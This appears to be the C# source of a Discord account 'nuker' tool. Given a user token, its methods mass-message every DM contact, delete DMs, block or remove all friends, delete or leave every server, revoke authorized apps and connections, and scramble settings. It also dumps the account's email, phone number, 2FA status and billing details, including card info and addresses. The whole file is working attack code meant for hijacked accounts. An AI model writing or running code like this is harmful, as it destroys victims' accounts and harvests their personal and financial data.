using Newtonsoft.Json.Linq;
using System.Threading;
using Console = Colorful.Console;
using System.Drawing;

namespace nuker
{
    public class User
    {
        public static string apiv = Config.APIVersion;
        public static int WaitTimeShort = Config.WaitTimeShort;
        public static int WaitTimeLong = Config.WaitTimeLong;

        public static void MassDM(string token, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                    Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteDMs(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/channels/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void BlockRelationships(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/relationships", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/relationships/{entry.id}", "PUT", token, $"{{\"type\":\"2\"}}");
                    Console.WriteLine($"Blocked: {entry.user.username}#{entry.user.discriminator}", Color.Lime);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void UserInformation(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me", token);
                var id = JObject.Parse(request)["id"].ToString();
                var getbadges = JObject.Parse(request)["flags"].ToString();
                string badges = "";
                if (getbadges == "1")
                {
                    badges += "Discord Employee, ";
                }
                if (getbadges == "2")
                {
                    badges += "Partnered Server Owner, ";
                }
                if (getbadges == "4")
                {
                    badges += "HypeSquad Events Member, ";
                }
                if (getbadges == "8")
                {
                    badges += "Bug Hunter Level 1, ";
                }
                if (getbadges == "64")
                {
                    badges += "House Bravery Member, ";
                }
                if (getbadges == "128")
                {
                    badges += "House Brilliance Member, ";
                }
                if (getbadges == "256")
                {
                    badges += "House Balance Member, ";
                }
                if (getbadges == "512")
                {
                    badges += "Early Nitro Supporter, ";
                }
                if (getbadges == "16384")
                {
                    badges += "Bug Hunter Level 2, ";
                }
                if (getbadges == "131072")
                {
                    badges += "Early Verified Bot Developer, ";
                }
                var email = JObject.Parse(request)["email"];
                var phone = JObject.Parse(request)["phone"];
                var bio = JObject.Parse(request)["bio"];
                var locale = JObject.Parse(request)["locale"];
                var nsfw = JObject.Parse(request)["nsfw_allowed"];
                var mfa = JObject.Parse(request)["mfa_enabled"];
                var avatarid = JObject.Parse(request)["avatar"].ToString();
                string avatar;
                if (string.IsNullOrEmpty(avatarid))
                {
                    avatar = "N/A";
                }
                else
                {
                    avatar = $"https://cdn.discordapp.com/avatars/{id}/{avatarid}.webp";
                }
                var request2 = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/settings", token);
                var theme = JObject.Parse(request2)["theme"];
                var devmode = JObject.Parse(request2)["developer_mode"];
                var status = JObject.Parse(request2)["status"];

                Console.WriteLine("User Information:\n");
                Console.WriteLine($"ID: {id}\nEmail: {email}\nPhone Number: {phone}\nBiography: {bio}\nLocale: {locale}\nNSFW Allowed: {nsfw}\n2FA Enabled: {mfa}\nBadges: {badges}\nTheme: {theme}\nDeveloper Mode: {devmode}\nStatus: {status}\nAvatar: {avatar}");
                Console.WriteLine("\nBilling Information:\n");

                var request3 = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/billing/payment-sources", token);
                var array = JArray.Parse(request3);
                foreach (dynamic entry in array)
                {
                    if (entry.type == "1")
                    {
                        var invalid = entry.invalid;
                        var brand = entry.brand;
                        var last4 = entry.last_4;
                        var expiresmonth = entry.expires_month;
                        var expiresyear = entry.expires_year;
                        var name = entry.billing_address["name"];
                        var address1 = entry.billing_address["line_1"];
                        var address2 = entry.billing_address["line_2"];
                        var city = entry.billing_address["city"];
                        var state = entry.billing_address["state"];
                        var country = entry.billing_address["country"];
                        var postalcode = entry.billing_address["postal_code"];
                        Console.WriteLine($"Type: Credit Card\nInvalid: {invalid}\nBrand: {brand}\nExpiration Date: {expiresmonth}/{expiresyear}\nCardholder Name: {name}\nLast 4 Digits: {last4}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                    }
                    else if (entry.type == "2")
                    {
                        var invalid = entry.invalid;
                        var name = entry.billing_address["name"];
                        var ppemail = entry.email;
                        var address1 = entry.billing_address["line_1"];
                        var address2 = entry.billing_address["line_2"];
                        var city = entry.billing_address["city"];
                        var state = entry.billing_address["state"];
                        var country = entry.billing_address["country"];
                        var postalcode = entry.billing_address["postal_code"];
                        Console.WriteLine($"Type: PayPal\nInvalid: {invalid}\nName: {name}\nEmail: {ppemail}\nAddress 1: {address1}\nAddress 2: {address2}\nCity: {city}\nState: {state}\nCountry: {country}\nPostal Code: {postalcode}");
                    }
                }

                Console.WriteLine("\nSubscription Information:\n");
                Console.WriteLine("SOON");
                Console.WriteLine("\nPress any key to go back.");
                Console.ReadKey();
                Console.Clear();

            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ConfuseMode(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/settings", token);
                var array = JObject.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/settings", "PATCH", token, $"{{\"locale\": \"zh-CN\",\"theme\": \"light\", \"developer_mode\": \"false\", \"message_display_compact\": \"true\", \"explicit_content_filter\": \"0\"}}");
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ChangeTheme(string token, string theme)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/settings", token);
                var array = JObject.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/settings", "PATCH", token, $"{{\"theme\": \"{theme}\"}}");
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void CreateGuild(string token, string name)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"https://discord.com/api/v{apiv}/guilds", "POST", token, $"{{\"name\": \"{name}\"}}");
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void RemoveConnections(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/connections", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/connections/{entry.type}/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.type}", Color.Lime);
                    Thread.Sleep(200);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeauthorizeApps(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/oauth2/tokens", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/oauth2/tokens/{entry.id}", "DELETE", token);
                    Console.WriteLine("Removed: " + entry.application["name"], Color.Lime);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void LeaveHypeSquad(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"https://discord.com/api/v{apiv}/hypesquad/online", "DELETE", token);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ClearRelationships(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/relationships", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/relationships/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Removed: {entry.user.username}#{entry.user.discriminator}", Color.Lime);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void LeaveDeleteGuilds(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me/guilds", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    if (entry.owner == true)
                    {
                        Request.Send($"https://discord.com/api/v{apiv}/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
                        Thread.Sleep(WaitTimeShort);
                    }
                    else
                    {
                        Request.Send($"https://discord.com/api/v{apiv}/users/@me/guilds/{entry.id}", "DELETE", token);
                        Console.WriteLine($"Left: {entry.name}", Color.Lime);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void EditProfile(string token, string hypesquad = null, string bio = null, string status = null)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                if (hypesquad == "0")
                {
                    Request.Send($"https://discord.com/api/v{apiv}/hypesquad/online", "DELETE", token);
                }
                else if (hypesquad == "1")
                {
                    Request.Send($"https://discord.com/api/v{apiv}/hypesquad/online", "POST", token, $"{{\"house_id\": 1}}");
                }
                else if (hypesquad == "2")
                {
                    Request.Send($"https://discord.com/api/v{apiv}/hypesquad/online", "POST", token, $"{{\"house_id\": 2}}");
                }
                else if (hypesquad == "3")
                {
                    Request.Send($"https://discord.com/api/v{apiv}/hypesquad/online", "POST", token, $"{{\"house_id\": 3}}");
                }

                if (!string.IsNullOrEmpty(bio))
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me", "PATCH", token, $"{{\"bio\": \"{bio}\"}}");
                }

                if (!string.IsNullOrEmpty(status))
                {
                    Request.Send($"https://discord.com/api/v{apiv}/users/@me/settings", "PATCH", token, $"{{\"custom_status\": {{\"text\": \"{status}\"}}}}");
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static string GetUsername(string token)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                string request = Request.SendGet($"https://discord.com/api/v{apiv}/users/@me", token);
                var username = JObject.Parse(request)["username"];
                var discriminator = JObject.Parse(request)["discriminator"];
                return $"{username}#{discriminator}";
            }
            catch { return "N/A"; }
        }
    }
}
